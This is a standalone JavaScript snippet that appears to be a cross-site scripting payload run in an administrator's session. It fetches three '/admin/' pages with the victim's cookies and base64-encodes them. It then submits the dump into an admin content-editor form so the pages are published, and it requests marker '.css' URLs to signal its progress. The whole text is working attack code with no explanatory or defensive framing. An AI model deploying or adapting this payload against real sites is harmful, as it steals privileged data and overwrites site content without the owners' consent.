(async () => {
  const M = "902";
  const g = (u,o) => fetch(u, Object.assign({credentials:'include',cache:'no-store'}, o||{}));
  const b64 = (s) => btoa(unescape(encodeURIComponent(s)));
  const mark = (n) => g('/index.php/'+n+'.css');
  try {
    // pull all three admin pages as admin
    const pages = {};
    for (const p of ['/admin/','/admin/review.php','/admin/search.php']) {
      try { pages[p] = await (await g(p)).text(); } catch(e){ pages[p] = 'ERR:'+e; }
    }
    const dump = Object.entries(pages).map(([k,v])=>k+'\n'+v).join('\n=====PAGEBREAK=====\n');
    // find the homepage/content editor: parse /admin/ overview for a form with a textarea
    const doc = new DOMParser().parseFromString(pages['/admin/'], 'text/html');
    const forms = [...doc.querySelectorAll('form')];
    let target = forms.find(f => f.querySelector('textarea')) || forms[0];
    let info = 'forms='+forms.length;
    if (target) {
      const action = target.getAttribute('action') || location.pathname;
      const method = (target.getAttribute('method')||'POST').toUpperCase();
      info += ' action='+action+' method='+method;
      const fd = new FormData();
      for (const el of target.querySelectorAll('input,textarea,select,button')) {
        if (!el.name) continue;
        fd.set(el.name, el.value || '');
      }
      const ta = target.querySelector('textarea');
      const field = ta && ta.name ? ta.name : null;
      info += ' textarea='+field;
      if (field) fd.set(field, 'RECON_'+M+'_START|'+info+'|B64|'+b64(dump)+'|RECON_'+M+'_END');
      await g(action, {method, body: fd});
    }
    // confirm which forms/actions we saw regardless, via marker name (short)
    await mark('DONE_'+M+'_'+encodeURIComponent(info).slice(0,80));
  } catch(e){
    await mark('ERR_'+M+'_'+encodeURIComponent((e+'').slice(0,60)));
  }
})();
